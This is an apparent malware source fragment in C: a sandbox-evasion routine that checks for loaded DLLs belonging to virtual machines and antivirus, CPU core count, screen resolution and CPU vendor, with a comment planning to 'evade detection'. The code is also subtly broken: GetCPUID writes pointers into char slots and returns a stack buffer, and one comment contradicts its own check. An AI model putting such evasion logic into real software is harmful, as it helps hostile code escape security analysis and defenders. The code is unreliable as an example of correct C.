const char* GetCPUID()
{
	// Grab Vendor ID using __cpuid intrinsic
	// TODO: Write own implementation of __cpuid to evade detection
	int CPUInfo[4] = { -1 };
	__cpuid(CPUInfo, 0);
 
	// Convert bitmask to string
	char vendor[512];
	memset(vendor, 0, sizeof(vendor));
	*(vendor) = (const char*)&CPUInfo[1];
	*(vendor + 4) = (const char*)&CPUInfo[3];
	*(vendor + 8) = (const char*)&CPUInfo[2];
 
	return vendor;
}
 
BOOL CheckSandbox(const char *DllList[], SIZE_T stBadDllSize)
{
	PSYSTEM_BASIC_INFORMATION sbi = NULL;
	LPVOID lpSbiBuffer = NULL;
	SIZE_T stSbiSize = NULL;
	MONITORINFO mInfo = { sizeof(MONITORINFO) };
	HMONITOR hMonitor = NULL;
	HWND hTopWindow = NULL;
	HANDLE hProcess = NULL;
	const char *vendor = NULL;
 
	// Check for evil DLLs that could indicate VM, AV, etc
	// Check each DLL to see if it is loaded into memory.
	// If the DLL is found, exit immediately.
	// TODO: Perhaps find a way to unload DLLs? Would be suspicious AF but hey would be neat
	for (int i = 0; i < stBadDllSize; i++)
	{
		if (GetModuleHandleA(DllList[i]) != 0)
			return TRUE;
	}
 
	// Allocate memory and declare structs for NtQuerySystemInformation
	hProcess = GetCurrentProcess();
	stSbiSize = sizeof(SYSTEM_BASIC_INFORMATION);
	int iResult = NtAllocateVirtualMemory(hProcess, &lpSbiBuffer, 0, &stSbiSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (iResult != STATUS_SUCCESS)
	{
		printf("NtAllocateVirtualMemory Failed: 0x%X", iResult);
 
		// Should I VirtualFree here? Who fkin knows.
 
		return TRUE;
	}
	
	sbi = (PSYSTEM_BASIC_INFORMATION)lpSbiBuffer;
	iResult = NtQuerySystemInformation(SystemBasicInformation, sbi, 64, NULL);
	if (iResult != STATUS_SUCCESS)
	{
		printf("NtQuerySystemInformation Failed: 0x%X", iResult);
 
		NtFreeVirtualMemory(hProcess, &lpSbiBuffer, NULL, MEM_RELEASE);
		return TRUE;
	}
 
	// Check number of processors in machine. If machine has 2 cores or less, machine likely to be a sandbox/VM.
	if (sbi->NumberOfProcessors >= 2)
	{
		// Check resolution of monitor. If resolution is smaller then 1280x720, machine likely to be a sandbox/VM.
		hTopWindow = GetTopWindow(NULL);
		hMonitor = MonitorFromWindow(hTopWindow, MONITOR_DEFAULTTOPRIMARY);
		if (GetMonitorInfoA(hMonitor, &mInfo))
		{
			if (mInfo.rcMonitor.right > 1280 && mInfo.rcMonitor.bottom > 720)
			{
				// Check CPUID for vendor id of cpu. If vendor ID not GenuineIntel or AuthenticAMD, machine likely to be a sandbox/VM.
				vendor = GetCPUID();
				if (strcmp(vendor, "GenuineIntel") == 0 || strcmp(vendor, "AuthenticAMD") == 0)
					return FALSE;
			}
		}
	}
 
	return TRUE;
}
